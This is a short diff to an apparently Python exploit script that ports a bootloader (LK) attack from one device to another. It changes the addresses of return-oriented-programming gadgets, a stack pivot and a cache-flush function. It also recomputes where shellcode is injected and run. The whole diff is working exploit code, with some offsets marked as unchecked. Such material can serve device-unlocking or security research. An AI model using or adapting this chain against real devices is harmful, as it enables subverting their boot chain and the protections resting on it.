@@ -5,16 +5,16 @@ import struct
 base = 0x4BD00000
 forced_addr = 0x45000000
 
-# 72a5e:       bd0b            pop     {r0, r1, r3, pc}
-pop_r0_r1_r3_pc = base + 0x72a5e|1
+# 7276e:       bd0b            pop     {r0, r1, r3, pc}
+pop_r0_r1_r3_pc = base + 0x7276e|1
 
-# 3c750:       e49df004        pop     {pc}            ; (ldr pc, [sp], #4)
-pop_pc = base + 0x3c750
+# 3c378:       e49df004        pop     {pc}            ; (ldr pc, [sp], #4)
+pop_pc = base + 0x3C378
 
 # 150:       4798            blx     r3 ;  pop     {r3, pc}
 blx_r3_pop_r3 = base + 0x150|1
 
-cache_func = base + 0x3C740
+cache_func = base + 0x3C368
 
 test = base + 0x185 # prints "Error, the pointer of pidme_data is NULL."
 
@@ -22,16 +22,15 @@ shellcode_sz = 0x1000 # TODO: check size
 
 lk_offset = base - forced_addr
 
-#inject_offset = 0x1000000
 inject_offset = lk_offset - shellcode_sz - 0x100
 
 inject_addr = forced_addr + inject_offset + 0x10
 shellcode_addr = forced_addr + inject_offset + 0x100
 
-# 577f0:       e913e7cd        ldmdb   r3, {r0, r2, r3, r6, r7, r8, r9, sl, sp, lr, pc}
-pivot = base + 0x577f0
+# 5799c:       e913e7cd        ldmdb   r3, {r0, r2, r3, r6, r7, r8, r9, sl, sp, lr, pc}
+pivot = base + 0x5799C
 
-ptr_offset = 0x3C0
+ptr_offset = 0x3C0 # to be checked
 
 r3_pc = base + (ptr_offset - 0x18) 
 ptr_pc = base + (ptr_offset - 0x08)
@@ -39,8 +38,7 @@ ptr_pc = base + (ptr_offset - 0x08)
 lk_r3_target = inject_addr + 0x10
 lk_ptr_target = inject_addr + 0x14
 
-page_size = 0x800 # suez forces 0x800 bytes
-
+page_size = 0x800 # giza forces 0x800 bytes
 
 def main():
     if len(sys.argv) < 2:
